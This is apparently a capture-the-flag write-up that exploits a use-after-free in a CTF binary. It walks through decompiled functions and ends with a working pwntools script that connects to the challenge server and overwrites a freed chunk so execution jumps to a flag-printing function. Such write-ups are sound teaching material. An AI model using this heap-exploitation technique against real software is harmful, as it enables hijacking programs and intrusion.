This challenge is really similar to woo2.
The main difference is in the pwnMe function :

In woo2, we have :

void __noreturn pwnMe()
{
  __int64 v0; // [sp+0h] [bp-10h]@1

  ++ if ( bearOffset != -1 )
  ++ {
	  v0 = (__int64)*(&pointers + bearOffset);
	  if ( *(_DWORD *)(v0 + 20) == 3 )
	    (*(void (**)(void))v0)();
  ++ }
  exit(0);
}

So in this challenge, we need to create a bear to be able to call our function.

Let's look a makeBear :

	__int64 makeBear()
	{
	  void *v0; // rax@1
	  void *v1; // ST08_8@1

	  v0 = malloc(0x18uLL);
	  v1 = v0;
	  *(_QWORD *)v0 = 3735928559LL;
	  *((_DWORD *)v0 + 5) = pickBearType(24LL);
	  puts("Enter the bear's name:");
	  fflush(stdout);
	  fgets((char *)v1 + 8, 12, stdin);
	  *(&pointers + next) = v1;
	  bearOffset = next;
	  return (unsigned int)(next++ + 1);
	}

This function is similar to makeTiger except that the name is not written
at the beggining of the buffer (0xDEADBEEF is written instead and the name
is written from v0[8]) so we cannot use this directly to jump to l33tH4x0r. 

We observe that bearOffset is set to next when we create a bear so in pwnMe,
the buffer v0 will always correspond to the buffer of the last created bear.

We can observe the deleteAnimal function :

	void deleteAnimal()
	{
	  int v0; // [sp+Ch] [bp-4h]@1

	  puts("Choose your friends wisely..");
	  puts("Which element do you want to delete?");
	  fflush(stdout);
	  __isoc99_scanf(4198456LL, &v0);
	  getchar();
	  if ( v0 > 0 && v0 <= 4 )
	    free(*(&pointers + v0));
	}

We see that the allocated buffer for an animal will be freed 
when we call deleteAnimal. However, when we chose 1 in the menu,
it is pointers[1] that will be freed and not pointers[0]. So the second
animal created will be freed (i = 1) and not the first (i = 0).

We want (&pointers + bearOffset) in pwnMe to point to a tiger (see woo_writeup)
so we can chose 3 as the type and the name of the tiger as the address to jump to.

Since the bearOffset does not change when we delete an animal, we can create a bear,
delete it and replace it with a tiger with type = 3 and name = 0x40090E.

So in order :
  - Create an animal (anything)
  - Create a bear (so bearoffset is different than -1)
  - delete the bear
  - Create a tiger to replace the bear in memory
    (&pointers + bearoffset) will now point to the tiger instead of the bear.
  - Call pwnME with the Menu Option 4919

This can be achieved with the following python script :

	from pwn import *
	
	# the address to jump to to print the flag
	l33tH4x0r_addr = 0x40090E

	with remote('104.155.227.252', 31337) as p:
		# make tiger
		print p.recvuntil('choice:')
		p.sendline('2') # tiger
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('tiger:')
		p.sendline('AAAA') # could be anything

		# make bear
		print p.recvuntil('choice:')
		p.sendline('3') # bear
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('name:')
		p.sendline('BBBB') # could be anything

		# delete second animal created (so the bear, with index = 1)
		print p.recvuntil('choice:')
		p.sendline('4') # bear
		print p.recvuntil('delete?')
		p.sendline('1') # type

		# make tiger
		print p.recvuntil('choice:', timeout=1)
		p.sendline('2') # tiger
		print p.recvuntil('want:', timeout=1)
		p.sendline('3') # type
		print p.recvuntil('tiger:', timeout=1)
		p.sendline(p64(l33tH4x0r_addr))

		# call pwnMe
		print p.recvuntil('choice:')
		p.sendline('4919')

		print p.recvall()